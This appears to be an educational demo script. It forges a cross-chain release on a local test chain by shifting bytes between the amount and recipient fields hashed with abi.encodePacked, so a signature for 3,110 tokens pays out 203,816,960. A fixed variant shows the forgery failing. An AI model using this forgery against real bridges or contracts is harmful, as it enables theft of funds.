// Attack #2: two messages, one hash. Amount and recipient arrive as raw variable-length bytes
// and the adapter hashes them glued together (abi.encodePacked). We ask for a legitimate
// 3,110-token transfer, get it properly signed, then move two bytes from the recipient into
// the amount. Same bytes, same hash, same signatures.
//   node demos/02-packed.mjs           the forged split releases 203,816,960
//   node demos/02-packed.mjs --fixed   abi.encode keeps each field's length: the forgery fails
import { startChain, stopChains, roles, verifiers, abis, sigsFrom, fmt } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "packed-fixed" : "packed", fixed ? "Packed encoding, fixed" : "Packed encoding");
const B = await startChain({ id: 31338, name: "chain B" });

const token = await B.deploy("token", ["Test NIGHT", "tNIGHT", 0]); // whole tokens
const kind = fixed ? "packedFixed" : "packed"; // --fixed only picks which adapter is deployed
const adapter = await B.deploy(kind, [token, verifiers.map((v) => v.address), 2n]);
await B.send(roles.relayer, token, abis.token, "mint", [adapter, 250_000_000n]);
t.say(`adapter holds ${fmt(await B.balanceOf(token, adapter), 0)} tNIGHT · 2 of 3 verifiers`);

// The legitimate request from chain A: 3,110 tokens to a 22-byte foreign-format address
// that ends in the attacker's EVM address.
const amountBytes = (n) => { const h = n.toString(16); return `0x${h.length % 2 ? "0" : ""}${h}`; }; // minimal big-endian bytes
const legit = { amount: amountBytes(3110n), recipient: `0x0000${roles.attacker.address.slice(2)}` };
const d = await B.read(adapter, abis[kind], "digestOf", [1n, legit.amount, legit.recipient]);
const sigs = await sigsFrom(verifiers.slice(0, 2), d);
t.cmd(`verifiers sign: 3,110 → ${legit.recipient.slice(0, 8)}…${legit.recipient.slice(-4)}`);

// The forgery: shift the boundary. Two bytes leave the recipient and join the amount.
const forged = { amount: `${legit.amount}0000`, recipient: roles.attacker.address };
const amt = BigInt(forged.amount);
const df = await B.read(adapter, abis[kind], "digestOf", [1n, forged.amount, forged.recipient]);
t.note(`forged: ${fmt(amt, 0)} → ${forged.recipient.slice(0, 6)}…${forged.recipient.slice(-4)}`);
t.say(df === d ? `  same hash as the signed message: YES` : `  same hash as the signed message: no`);

t.cmd(`attacker → release(forged fields, the real signatures)`);
const r = await B.attempt(roles.attacker, adapter, abis[kind], "release", [1n, forged.amount, forged.recipient, sigs]);
if (!r.ok) t.ok(`  ✗ reverted: ${r.name}`);
const got = await B.balanceOf(token, roles.attacker.address);
if (r.ok) t.bad(`  ✓ RELEASED ${fmt(got, 0)} tNIGHT`);
// The verdict comes from the attacker's balance, not from the flag.
t.big(got > 3110n ? `SIGNED FOR 3,110 · PAID ${fmt(got, 0)}` : `FORGERY REJECTED · paid ${fmt(got, 0)}`);
t.save(); stopChains(); process.exit(0);
